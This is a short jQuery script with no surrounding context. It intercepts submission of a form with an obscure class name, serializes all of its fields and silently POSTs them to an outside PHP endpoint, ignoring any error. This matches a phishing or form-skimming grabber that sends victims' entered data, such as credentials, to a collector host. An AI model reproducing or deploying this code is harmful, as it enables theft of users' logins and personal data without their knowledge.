$(".falxvrf").submit(function() {
	var d = $(".falxvrf");

	$.ajax({
        url: "http://gyis.adon.my.id/apiii.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
